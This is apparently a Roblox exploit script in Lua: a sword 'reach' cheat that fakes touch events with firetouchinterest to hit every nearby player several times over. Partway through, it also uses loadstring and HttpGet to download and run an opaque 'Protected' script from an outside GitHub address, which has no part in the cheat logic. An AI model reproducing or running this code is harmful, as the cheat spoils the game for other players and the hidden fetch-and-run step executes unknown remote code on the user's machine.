shared.Config = {
    DamageMultiplier = 5,
    MaxDistance = 15
}

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function SwordHit(Player, Hit, SwordHandle)
    if Player.Character:FindFirstChildOfClass("Humanoid") and (Player ~= LocalPlayer) then
        for Index, Object in pairs(Player.Character:GetChildren()) do
            if Object:IsA("BasePart") then
                for Iteration = 1, shared.Config.DamageMultiplier do
                    firetouchinterest(Object, SwordHandle, 0)
                    firetouchinterest(Object, SwordHandle, 1)
                    firetouchinterest(Object, SwordHandle, 0)
                end
            end
        end
    end
end
task.wait(0.1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/h4xal0t/wtf/main/Protected_9909131513277395.lua.txt"))()
game:GetService("RunService").RenderStepped:Connect(function()
    local Sword = (LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool"))
    
    if Sword then
        local Handle = (Sword:FindFirstChild("Handle") or Sword:FindFirstChildOfClass("Part"))
        
        if Handle then
            for Index, Player in pairs(Players:GetPlayers()) do
                local HumanoidRootPart = (Player.Character and Player.Character:FindFirstChild("HumanoidRootPart"))
                if HumanoidRootPart then
                    local Distance = (HumanoidRootPart.Position - Handle.Position).Magnitude
                    
                    if Distance <= shared.Config.MaxDistance then
                        SwordHit(Player, HumanoidRootPart, Handle)
                    end
                end
            end
        end
    end
end)